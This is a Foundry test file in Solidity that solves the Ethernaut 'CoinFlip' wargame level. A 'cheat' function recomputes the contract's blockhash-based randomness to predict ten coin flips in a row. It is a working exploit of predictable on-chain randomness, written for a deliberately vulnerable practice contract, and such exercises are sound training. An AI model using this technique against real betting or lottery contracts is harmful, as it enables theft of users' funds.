// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/CoinFlip/CoinFlip.sol";
import "../src/CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";

contract Fal1outTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_coinFlip_attack() public {
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        for (uint i = 0; i < 10; i++) {
            bool guess = cheat();
            ethernautCoinFlip.flip(guess);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            vm.roll(blockValue + 1);

            uint winCounts = ethernautCoinFlip.consecutiveWins();
            console.log("win counts:", winCounts);
        }

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }

    function cheat() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
